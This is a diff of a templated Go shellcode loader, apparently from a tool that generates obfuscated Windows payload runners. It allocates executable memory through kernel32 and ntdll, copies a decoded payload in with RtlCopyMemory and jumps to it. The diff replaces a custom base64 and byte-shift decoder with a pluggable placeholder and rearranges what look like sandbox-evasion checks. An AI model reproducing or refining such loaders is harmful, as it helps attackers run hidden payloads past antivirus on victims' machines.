@@ -2,19 +2,17 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/hex"
 	"syscall"
 	"time"
 	"unsafe"
 )
-
+var $keyName []byte
 const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
 )
-
-var $keyName []byte
-
 
 var (
 	kernel32      = syscall.MustLoadDLL("kernel32.dll")
@@ -23,22 +21,7 @@ var (
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
-func $getDeCode(string2 string) []byte {
-
-	ss, _ := base64.StdEncoding.DecodeString(string2)
-	string2 = string(ss)
-	var code []byte
-
-	bydata := []byte(string2)
-
-	for i := 0; i < len(bydata); i++ {
-		code = append(code, bydata[i]-$keyName[0]+$keyName[1])
-	}
-	ssb, _ := base64.StdEncoding.DecodeString(string(code))
-	return ssb
-
-}
-
+$method$
 
 
 func $genEXE(charcode []byte) {
@@ -52,7 +35,6 @@ func $genEXE(charcode []byte) {
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
 	}
-	$gd()
 	$gd()
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
@@ -77,6 +59,7 @@ func $gd() int {
 func main() {
 	$bbdata := "$bdata"
 	$keyName = []byte("$keys")
+	$gd()
 	$shellCodeHex := $getDeCode($bbdata)
 	$gd()
 	$genEXE($shellCodeHex)
